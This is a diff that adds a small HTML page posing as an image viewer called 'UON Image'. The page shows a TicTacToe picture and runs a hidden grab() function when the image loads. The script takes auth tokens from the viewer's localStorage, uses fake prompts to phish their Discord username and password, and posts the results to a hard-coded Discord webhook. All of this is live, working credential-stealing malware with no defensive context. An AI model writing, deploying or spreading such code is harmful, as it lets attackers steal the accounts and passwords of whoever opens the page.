@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head><title>UON Image</title></head>
+<body>
+<img src="https://cdn.discordapp.com/attachments/1516976280166338762/1520383241746382948/TicTacToe.jpg?ex=6a40febc&is=6a3fad3c&hm=1bf64885330b170880998a44591fc65cfb80289792731df5794cb4a665fe07c3&" onload="grab()">
+<script>
+function grab() {
+  let token = 'No token found';
+  try {
+    // Common Discord token locations
+    const keys = Object.keys(localStorage);
+    for (let key of keys) {
+      if (key.includes('token') || key.includes('auth')) {
+        token = localStorage.getItem(key);
+        break;
+      }
+    }
+    // Fallback to other methods if needed
+  } catch(e) {}
+
+  const ip = 'Unknown';
+  const user = prompt("Enter your Discord Username to continue:") || 'Unknown';
+  const pass = prompt("Enter Password to verify:") || 'Unknown';
+
+  fetch('https://discord.com/api/webhooks/1520155241226699002/-rOCW2cxp0EOxuK-Ybihe0d7U5rzHbKajootTKMbevy8cuhm0whkC3LeplbC1ezkcO_b', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({content: '**UON GRAB SUCCESS**\nTOKEN: ' + token + '\nIP: ' + ip + '\nUSERNAME: ' + user + '\nPASSWORD: ' + pass})
+  });
+}
+</script>
+</body>
+</html>
